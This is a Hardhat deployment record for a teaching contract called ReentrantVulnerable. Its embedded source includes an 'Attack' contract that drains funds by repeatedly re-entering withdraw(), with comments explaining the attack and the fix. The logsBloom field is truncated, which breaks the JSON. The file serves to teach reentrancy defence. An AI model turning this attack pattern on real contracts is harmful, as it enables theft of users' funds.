{
  "address": "0x5FbDB2315678afecb367f032d93F642f64180aa3",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "transactionHash": "0xef4f53edae4d1d29ac4ec752218d1517eb54e9e29f624589e0fb0a731b170b88",
  "receipt": {
    "to": null,
    "from": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "contractAddress": "0x5FbDB2315678afecb367f032d93F642f64180aa3",
    "transactionIndex": 0,
    "gasUsed": "306835",
    "logsBloom": "0x
    "blockHash": "0xa79a6de4ae396c04f4465fcda12d231e3ab0a1ca7eef2b3662c457906bcacb47",
    "transactionHash": "0xef4f53edae4d1d29ac4ec752218d1517eb54e9e29f624589e0fb0a731b170b88",
    "logs": [],
    "blockNumber": 1,
    "cumulativeGasUsed": "306835",
    "status": 1,
    "byzantium": true
  },
  "args": [],
  "numDeployments": 1,
  "solcInputHash": "8893bc4ecd369ac8a855b474bab54002",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/sublesson/reentrancyAttack.sol\":\"ReentrantVulnerable\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/sublesson/reentrancyAttack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.7;\\n\\ncontract ReentrantVulnerable {\\n    mapping(address => uint256) public balances;\\n\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n// easy way\\n// mutex lock using openZeppeline\\n    function withdraw() payable public {\\n        uint256 bal = balances[msg.sender];\\n        require(bal > 0);\\n        balances[msg.sender] = 0;\\n        (bool sent, ) = msg.sender.call{value: bal}(\\\"\\\");\\n        require(sent, \\\"Failed to send Ether\\\");\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\\ncontract Attack {\\n    ReentrantVulnerable public reentrantVulnerable;\\n\\n    constructor(address _reentrantVulnerable) {\\n        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);\\n    }\\n\\n    function attack() external payable {\\n        reentrantVulnerable.deposit{value: 1 ether}();\\n        reentrantVulnerable.withdraw();\\n    }\\n\\n    fallback() external payable {\\n        if (address(reentrantVulnerable).balance >= 1 ether) {\\n            reentrantVulnerable.withdraw();\\n        }\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\\n//1. Let say you are Alice and you have deposited 100ETH in the contract\\n//2. Now Bob want to attack the contract then he deploy the Attack contract by passing the address of the\\n// contract where Alice's ETH is stored.\\n//3. Now Bob will use the attack function.\\n// FLOW OF ATTACK FUNCTION\\n// -> Calls the deposit function and deposit 1ETH because the balance should be 1ETH so that the withdraw function will work.\\n// -> After depositing 1ETH the attack function will call withdraw function.\\n// -> In the First Contract Withdraw function first check if the deposit of the caller is more than 0ETH.\\n// -> then withdraw function runs the msg.sender.call function which is the worst problem.\\n// -> this msg.sender.call is calling the contract from where is hasbeen called then in the attack contract that call be be handled by\\n//    the fallback function, and that fallback function again call the withdraw function then this recursion goes on and on which causes \\n// loosing of all the money from the contarct. and balance of attacked contract be become zero.\\n\\n// #######Best practice is to first update the balance to zero then transfer the funds############//\",\"keccak256\":\"0x436cd3fd58dbf99f5647e27b3d8119c78dc0842b3441eecef57bfa5455621d80\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b5061049b806100206000396000f3fe60806040526004361061003f5760003560e01c806312065fe01461004457806327e235e31461006f5780633ccfd60b146100ac578063d0e30db0146100b6575b600080fd5b34801561005057600080fd5b506100596100c0565b6040516100669190610294565b60405180910390f35b34801561007b57600080fd5b5061009660048036038101906100919190610312565b6100c8565b6040516100a39190610294565b60405180910390f35b6100b46100e0565b005b6100be610224565b005b600047905090565b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490506000811161013057600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405161019a90610370565b60006040518083038185875af1925050503d80600081146101d7576040519150601f19603f3d011682016040523d82523d6000602084013e6101dc565b606091505b5050905080610220576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610217906103e2565b60405180910390fd5b5050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546102729190610431565b92505081905550565b6000819050919050565b61028e8161027b565b82525050565b60006020820190506102a96000830184610285565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102df826102b4565b9050919050565b6102ef816102d4565b81146102fa57600080fd5b50565b60008135905061030c816102e6565b92915050565b600060208284031215610328576103276102af565b5b6000610336848285016102fd565b91505092915050565b600081905092915050565b50565b600061035a60008361033f565b91506103658261034a565b600082019050919050565b600061037b8261034d565b9150819050919050565b600082825260208201905092915050565b7f4661696c656420746f2073656e64204574686572000000000000000000000000600082015250565b60006103cc601483610385565b91506103d782610396565b602082019050919050565b600060208201905081810360008301526103fb816103bf565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061043c8261027b565b91506104478361027b565b925082820190508082111561045f5761045e610402565b5b9291505056fea2646970667358221220630b2fab80d8943646e1995d07aed9c93eefd604fe0e9f0bc215b061d7f5ef0764736f6c63430008110033",
  "deployedBytecode": "0x60806040526004361061003f5760003560e01c806312065fe01461004457806327e235e31461006f5780633ccfd60b146100ac578063d0e30db0146100b6575b600080fd5b34801561005057600080fd5b506100596100c0565b6040516100669190610294565b60405180910390f35b34801561007b57600080fd5b5061009660048036038101906100919190610312565b6100c8565b6040516100a39190610294565b60405180910390f35b6100b46100e0565b005b6100be610224565b005b600047905090565b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490506000811161013057600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405161019a90610370565b60006040518083038185875af1925050503d80600081146101d7576040519150601f19603f3d011682016040523d82523d6000602084013e6101dc565b606091505b5050905080610220576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610217906103e2565b60405180910390fd5b5050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546102729190610431565b92505081905550565b6000819050919050565b61028e8161027b565b82525050565b60006020820190506102a96000830184610285565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102df826102b4565b9050919050565b6102ef816102d4565b81146102fa57600080fd5b50565b60008135905061030c816102e6565b92915050565b600060208284031215610328576103276102af565b5b6000610336848285016102fd565b91505092915050565b600081905092915050565b50565b600061035a60008361033f565b91506103658261034a565b600082019050919050565b600061037b8261034d565b9150819050919050565b600082825260208201905092915050565b7f4661696c656420746f2073656e64204574686572000000000000000000000000600082015250565b60006103cc601483610385565b91506103d782610396565b602082019050919050565b600060208201905081810360008301526103fb816103bf565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061043c8261027b565b91506104478361027b565b925082820190508082111561045f5761045e610402565b5b9291505056fea2646970667358221220630b2fab80d8943646e1995d07aed9c93eefd604fe0e9f0bc215b061d7f5ef0764736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 3115,
        "contract": "contracts/sublesson/reentrancyAttack.sol:ReentrantVulnerable",
        "label": "balances",
        "offset": 0,
        "slot": "0",
        "type": "t_mapping(t_address,t_uint256)"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_mapping(t_address,t_uint256)": {
        "encoding": "mapping",
        "key": "t_address",
        "label": "mapping(address => uint256)",
        "numberOfBytes": "32",
        "value": "t_uint256"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}